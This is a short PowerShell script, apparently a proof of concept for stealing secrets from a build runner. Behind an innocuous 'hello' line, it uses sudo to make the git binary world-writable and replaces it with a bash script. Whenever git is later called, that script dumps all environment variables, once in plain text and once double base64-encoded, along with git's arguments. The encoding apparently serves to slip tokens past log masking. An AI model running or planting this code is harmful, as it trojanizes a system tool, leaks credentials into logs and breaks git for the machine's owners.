Write-Host "hello"

$content = @"
#!/bin/bash

env
echo ----
env |base64 |base64 
echo ----

for word in \"\$@\"; do echo \$word; done
echo ----
echo bye
"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
